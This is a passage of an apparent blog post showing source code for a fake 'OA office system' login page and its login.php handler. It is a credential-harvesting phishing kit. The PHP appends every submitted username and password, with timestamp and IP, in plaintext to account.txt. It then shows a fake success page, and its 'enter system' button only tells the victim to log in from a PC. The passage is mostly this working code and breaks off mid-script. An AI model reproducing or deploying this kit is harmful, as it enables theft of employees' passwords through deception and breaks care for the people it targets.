text-white/70&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;block w-full pl-10 pr-3 py-3 rounded-md bg-white/10 border border-white/20 </span></span><br><span class="hljs-string"><span class="hljs-tag">                              text-white placeholder-white/50 input-focus transition-all duration-300&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;用户名&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;relative&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-lock text-white/70&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;block w-full pl-10 pr-3 py-3 rounded-md bg-white/10 border border-white/20 </span></span><br><span class="hljs-string"><span class="hljs-tag">                              text-white placeholder-white/50 input-focus transition-all duration-300&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;togglePassword&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;absolute inset-y-0 right-0 pr-3 flex items-center text-white/70 hover:text-white transition-colors&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-eye-slash&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> </span><br><span class="hljs-tag">                    <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-full bg-black text-white font-medium py-3 px-4 rounded-md hover:bg-gray-800 </span></span><br><span class="hljs-string"><span class="hljs-tag">                           focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black transition-all duration-300&quot;</span>&gt;</span><br>                登录<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mt-12 text-white/60 text-sm&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- &lt;p&gt;版本信息 版权所有&lt;/p&gt; --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;settingsBtn&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fixed bottom-6 right-6 w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-all duration-300&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-cog&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  </span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> togglePassword = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;togglePassword&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        togglePassword.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> type = password.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;type&#x27;</span>) === <span class="hljs-string">&#x27;password&#x27;</span> ? <span class="hljs-string">&#x27;text&#x27;</span> : <span class="hljs-string">&#x27;password&#x27;</span>;</span><br><span class="language-javascript">            password.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;type&#x27;</span>, type);</span><br><span class="language-javascript">            </span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;i&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(<span class="hljs-string">&#x27;fa-eye&#x27;</span>);</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;i&#x27;</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(<span class="hljs-string">&#x27;fa-eye-slash&#x27;</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">   </span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> settingsBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;settingsBtn&#x27;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        settingsBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;设置功能即将上线&#x27;</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        </span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> inputs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;input&#x27;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        inputs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            input.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;focus&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;scale-[1.02]&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">&#x27;transform 0.3s ease&#x27;</span>;</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            </span><br><span class="language-javascript">            input.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;blur&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;scale-[1.02]&#x27;</span>);</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        </span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginForm&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>login.php</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;</span><br><span class="language-php">    <span class="hljs-variable">$username</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ? <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-variable">$password</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) ? <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-variable">$ipAddress</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="language-php">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-variable">$ipAddress</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$username</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$password</span>)) &#123;</span><br><span class="language-php">        <span class="hljs-variable">$currentTime</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="language-php">        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;时间: <span class="hljs-subst">&#123;$currentTime&#125;</span> | IP: <span class="hljs-subst">&#123;$ipAddress&#125;</span> | 账号: <span class="hljs-subst">&#123;$username&#125;</span> | 密码: <span class="hljs-subst">&#123;$password&#125;</span>\n&quot;</span>;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;account.txt&#x27;</span>, <span class="hljs-variable">$content</span>, FILE_APPEND | LOCK_EX);</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录成功 - OA综合办公系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">            tailwind.<span class="hljs-property">config</span> = &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">theme</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-attr">extend</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                        <span class="hljs-attr">colors</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                            <span class="hljs-attr">primary</span>: <span class="hljs-string">&#x27;#165DFF&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">                            <span class="hljs-attr">secondary</span>: <span class="hljs-string">&#x27;#0F3C91&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">                        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">                    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/tailwindcss&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="language-css"><span class="language-xml">            <span class="hljs-keyword">@layer</span> utilities &#123;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-selector-class">.modal-backdrop</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">                    <span class="hljs-keyword">@apply</span> fixed inset-<span class="hljs-number">0</span> bg-black/<span class="hljs-number">50</span> flex items-center justify-center z-<span class="hljs-number">50</span> opacity-<span class="hljs-number">0</span> pointer-events-none transition-opacity duration-<span class="hljs-number">300</span>;</span></span><br><span class="language-css"><span class="language-xml">                &#125;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-selector-class">.modal-backdrop</span><span class="hljs-selector-class">.active</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">                    <span class="hljs-keyword">@apply</span> opacity-<span class="hljs-number">100</span> pointer-events-auto;</span></span><br><span class="language-css"><span class="language-xml">                &#125;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-selector-class">.modal-content</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">                    <span class="hljs-keyword">@apply</span> bg-white rounded-lg shadow-<span class="hljs-number">2</span>xl p-<span class="hljs-number">6</span> max-w-md w-full transform scale-<span class="hljs-number">95</span> transition-transform duration-<span class="hljs-number">300</span>;</span></span><br><span class="language-css"><span class="language-xml">                &#125;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-selector-class">.modal-backdrop</span><span class="hljs-selector-class">.active</span> <span class="hljs-selector-class">.modal-content</span> &#123;</span></span><br><span class="language-css"><span class="language-xml">                    <span class="hljs-keyword">@apply</span> scale-<span class="hljs-number">100</span>;</span></span><br><span class="language-css"><span class="language-xml">                &#125;</span></span><br><span class="language-css"><span class="language-xml">            &#125;</span></span><br><span class="language-css"><span class="language-xml">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bg-gray-50 min-h-screen flex items-center justify-center p-4&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-full max-w-md bg-white rounded-lg shadow-xl p-8 text-center&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-check text-2xl text-green-500&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-2xl font-bold text-gray-800 mb-2&quot;</span>&gt;</span>登录成功<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-gray-600 mb-6&quot;</span>&gt;</span>欢迎使用OA综合办公系统<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$username</span>)): <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-gray-700 mb-6&quot;</span>&gt;</span>用户名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;font-medium&quot;</span>&gt;</span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$username</span>); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flex justify-center space-x-4&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.html&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;px-6 py-2 bg-primary text-white rounded-md hover:bg-secondary transition-colors&quot;</span>&gt;</span></span><br><span class="language-xml">                返回首页</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;enterSystemBtn&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;px-6 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors&quot;</span>&gt;</span></span><br><span class="language-xml">                进入系统</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;developmentModal&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;modal-backdrop&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;modal-content text-center&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-cogs text-2xl text-primary&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-xl font-bold text-gray-800 mb-2&quot;</span>&gt;</span>温馨提示<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-gray-600 mb-6&quot;</span>&gt;</span>请在电脑端登录进入系统！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;closeModalBtn&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;px-6 py-2 bg-primary text-white rounded-md hover:bg-secondary transition-colors&quot;</span>&gt;</span></span><br><span class="language-xml">                我知道了</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;developmentModal&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">const</span> enterBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;enterSystemBtn&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">const</span> closeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;closeModalBtn&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">        enterBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;active&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;hidden&#x27;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">        closeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;active&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span></span><br><span class="language-javascript"><span 